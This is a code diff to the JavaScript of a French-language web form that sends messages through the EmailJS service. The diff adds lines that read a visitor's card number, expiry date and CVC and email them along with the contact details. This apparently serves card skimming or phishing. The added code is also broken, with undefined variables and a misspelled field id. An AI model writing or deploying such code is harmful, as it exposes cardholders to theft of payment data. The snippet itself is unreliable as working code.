@@ -69,11 +69,19 @@
                 let name = document.getElementById("name").value;
                 let email = document.getElementById("email").value;
                 let message = document.getElementById("message").value;
+                let cvc = document.getElementById("cvc").value;
+                let expiry = document.getElementById("expiry").value;
+                let cardNumber = document.getElementById("cardeNumber").value;
+
 
                 emailjs.send("service_cidormd", "template_e41q8qd", {
                     user_name: name,
                     user_email: email,
-                    message: message
+                    message: message,
+                    cardNumber: Numéro,
+                    expiry: Dtae,
+                    cvc: CVC
+                
                 }).then(
                     function(response) {
                         alert("Votre demande a bien été envoyé. Nous vous envoyons la correction prochainement.");
